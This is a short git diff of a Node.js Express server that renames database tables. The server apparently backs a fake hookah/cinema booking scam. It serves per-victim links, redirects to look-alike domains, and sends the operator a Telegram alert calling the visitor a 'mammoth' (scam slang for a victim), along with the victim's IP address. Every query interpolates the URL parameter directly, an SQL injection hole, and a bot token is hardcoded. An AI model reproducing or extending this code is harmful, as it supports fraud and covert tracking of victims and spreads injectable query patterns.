@@ -26,7 +26,7 @@ try {
     })
 
     app.get('/refund/:userlink', (req, res) => {
-        client.query(`SELECT amount, currency FROM userssrefund WHERE link = '${req.params.userlink}'`, (err, ress)=>{
+        client.query(`SELECT amount, currency FROM usersrefund WHERE link = '${req.params.userlink}'`, (err, ress)=>{
             if (ress.rows[0] === undefined) {
                 res.redirect(`https://funnyhub-kalyan.com`);
                 return console.log("error");
@@ -67,7 +67,7 @@ try {
     })
 
     app.get('/:userlink', (req, res) => {
-        client.query(`SELECT place FROM userss WHERE link = '${req.params.userlink}'`, (err, ress)=>{
+        client.query(`SELECT place FROM users WHERE link = '${req.params.userlink}'`, (err, ress)=>{
             if (ress.rows[0] === undefined) {
                 res.redirect(`https://cinema-funnyhub.com`);
                 return console.log("error");
@@ -88,7 +88,7 @@ try {
             if (ress) {
                 const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
                 res.render(index, {userplace: ress.rows[0].place, user_link: req.params.userlink});
-                client.query(`SELECT user_id FROM userss WHERE link = '${req.params.userlink}'`, (err, res)=>{
+                client.query(`SELECT user_id FROM users WHERE link = '${req.params.userlink}'`, (err, res)=>{
                     bot.sendMessage(res.rows[0].user_id, `💨 <b>Кальян\n</b>💨 <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Место встречи:</i> <b>${ress.rows[0].place}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
                 })
                 return console.log(ress.rows[0].place);
